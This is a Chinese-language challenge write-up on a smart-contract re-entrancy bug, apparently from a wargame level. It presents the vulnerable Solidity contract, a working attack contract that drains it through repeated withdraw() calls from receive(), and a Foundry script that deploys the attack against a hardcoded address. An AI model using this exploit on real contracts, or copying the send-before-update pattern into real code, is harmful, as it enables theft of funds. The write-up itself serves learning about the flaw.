# Re-entrancy 重入漏洞

## 目标合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//0xF99A6795fd3d6678646ECf5E39dD19DF613eC0Ce
contract Reentrance {
    mapping(address => uint256) public balances;

    constructor() payable {}

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

可以看到目标合约有一个`withdraw()`函数可以向外提钱,并且是先转钱再改变余额状态,显然是重入漏洞

那我们就可以写个攻击合约,先调用`donate()`充钱,再`withdraw()`提钱,这时候会触发攻击合约的`receive()`函数,我们在`receive()`函数里继续`withdraw()`,直到偷光目标合约的钱

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Reentrance} from "./Re-entrancy.sol";

contract Attack {
    Reentrance public reentrance;

    constructor(address payable addr) {
        reentrance = Reentrance(addr);
    }

    function attack() external payable {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);

        require(address(reentrance).balance == 0, "addr balance>0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(1 ether, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}

```

这里这个`min()`函数,是返回x和y中更小的那个

* 三元运算符:`x <= y ? x : y`: 如果x<=y是真,就输出x,反之就输出y

脚本

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            payable(0x9282Bb8946BE30566013f51458360DF3d2786C9C)
        );
        attack.attack{value: 1 ether}();//这里记得给钱
        vm.stopBroadcast();
    }
}
```


> 更新: 2025-07-14 14:54:24  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ocr45hwzy2utis8r>